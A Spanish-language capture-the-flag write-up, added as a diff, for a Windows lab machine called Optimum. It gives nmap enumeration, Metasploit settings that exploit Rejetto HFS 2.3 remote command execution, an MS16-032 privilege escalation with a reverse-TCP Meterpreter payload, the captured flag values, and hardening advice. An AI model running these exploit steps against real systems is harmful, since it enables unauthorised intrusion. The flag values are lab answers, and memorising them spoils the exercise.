@@ -1,0 +1,62 @@
+Resumen Ejecutivo:
+
+Optimum es una máquina Windows que presenta una vulnerabilidad de ejecución remota de comandos (RCE) en un servicio de transferencia de archivos de terceros (Rejetto HFS). 
+La resolución requiere no solo la explotación del servicio, sino también la comprensión de las arquitecturas de procesos para realizar una escalada de privilegios exitosa mediante una vulnerabilidad de Kernel.
+
+Enumeración:
+Escaneo de Puertos (Nmap)
+
+nmap -sV -p80 10.129.34.242
+
+Resultados:
+
+Port 80 (HTTP): HttpFileServer httpd 2.3 (Rejetto HFS).
+
+OS Guess: Windows Server 2012 R2.
+
+Explotación (Foothold)
+Vector de Ataque
+El software Rejetto HFS 2.3 es vulnerable a RCE debido a un fallo en el filtrado de caracteres nulos (%00) en las macros de búsqueda.
+
+Ejecución con Metasploit
+Módulo: exploit/windows/http/rejetto_hfs_exec
+
+Configuración:
+
+LHOST: 10.10.14.204
+
+RHOSTS: 10.129.34.242
+
+Resultado: Sesión de Meterpreter obtenida como el usuario kostas.
+
+Nota técnica: Al ejecutar sysinfo, se observa que el sistema es x64, pero la sesión de Meterpreter es x86/windows. Esto limita ciertas funciones de post-explotación.
+
+Escalada de Privilegios (LPE)
+Identificación de Vulnerabilidad
+Se utilizó el módulo post/multi/recon/local_exploit_suggester, el cual identificó que el sistema era vulnerable a MS16-032.
+
+Explotación del Kernel (Secondary Logon Service)
+Para superar la restricción de arquitectura, se configuró el exploit para forzar un target de 64 bits:
+
+use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+set SESSION 1
+set TARGET 1  # Especifica arquitectura x64
+set payload windows/x64/meterpreter/reverse_tcp
+run
+Resultado: Sesión 2 abierta con privilegios de NT AUTHORITY\SYSTEM.
+
+Flags
+User: 5f33d267745bc2ef7982044ab9796d38
+
+Ubicación: C:\Users\kostas\Desktop\user.txt
+
+Root: ae551184b8cc8ad79b600c64ea6d390d
+
+Ubicación: C:\Users\Administrator\Desktop\root.txt
+
+Recomendaciones de Seguridad (Hardening)
+Actualización de Aplicaciones: El servicio Rejetto HFS 2.3 está obsoleto y debe ser reemplazado o actualizado a versiones que no permitan ejecución de macros en peticiones HTTP.
+
+Parches de Seguridad: Instalar el parche correspondiente a MS16-032 para mitigar la vulnerabilidad en el servicio de inicio de sesión secundario.
+
+Arquitectura de Red: Restringir el acceso al puerto 80 mediante firewall, permitiendo solo IPs autorizadas si el servicio es de uso interno.
